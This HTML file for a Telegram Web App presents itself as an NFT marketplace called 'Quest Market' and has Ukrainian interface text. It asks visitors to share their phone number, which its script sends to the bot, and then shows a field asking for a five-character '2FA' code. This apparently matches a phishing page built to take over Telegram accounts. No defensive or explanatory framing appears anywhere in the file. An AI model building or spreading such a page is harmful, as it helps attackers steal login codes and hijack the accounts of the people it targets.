<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Quest Market</title>
  <link rel="stylesheet" href="style.css">
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
  <div class="loadingpage">
        <div class="load-bg">
          <div class="bg-item" id="item1">
            <img src="nft1.png" alt="">
          </div>
          <div class="bg-item" id="item2">
            <img src="nft2.png" alt="">
          </div>
          <div class="bg-item" id="item3">
            <img src="nft3.png" alt="">
          </div>
          <div class="bg-item" id="item4">
            <img src="nft4.png" alt="">
          </div>
        </div>
        <h1 id="loadtext">Quest</h1>
        <div class="loader"></div>

  </div>

  <div class="page1">
    <img class="main-logo" src="./ico.png" alt="">
    <h1>Quest Market</h1>
    <p>Натисни, щоб поділитися номером телефону :point_down:</p>
    <button id="sharePhone">Поділитись номером</button>
  </div>

  <script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    document.getElementById("sharePhone").addEventListener("click", async () => {
      try {
        // :fire: Новий офіційний метод — викликає popup Telegram
        const contact = await tg.requestContact();

        if (contact && contact.phone_number) {
          tg.sendData(contact.phone_number); // надсилаємо номер назад у бот
        } else {
          console.warn("Користувач скасував або не надав номер");
        }
      } catch (e) {
        console.error("Помилка при запиті номера:", e);
      }
    });
  </script>
    </div>

    <div class="page2">

        <h1 id="req2fa">Введіть код 2FA</h1>
        <input maxlength="5" placeholder="" id="code2fa"/>
    </div>
</body>
</html>
